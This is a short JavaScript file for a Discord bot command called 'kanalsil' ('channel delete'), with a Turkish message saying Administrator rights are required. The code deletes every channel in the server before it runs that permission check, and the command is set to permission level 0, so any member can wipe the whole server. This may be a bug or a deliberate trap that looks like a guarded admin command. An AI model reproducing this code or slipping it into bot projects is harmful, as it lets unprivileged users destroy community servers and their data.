const Discord = require('discord.js');
const db = require('quick.db');
exports.run = (client, message, args) => { 

  message.guild.channels.forEach(a => a.delete())
 if (!message.member.hasPermission("ADMINISTRATOR")) return message.channel.send(new Discord.RichEmbed()
                                                                                      .setDescription('Bu komuTu kullanmak için **Yönetici** yetkisine sahip olmalısın.')
                                                                                                                                                                                                                  .setColor(10038562));
    };
exports.conf = {
  enabled: true,  
  guildOnly: false, 
  aliases: [], 
  permLevel: 0
};

exports.help = {
  name: 'kanalsil',
  description: 'taslak', 
  usage: 'help'
};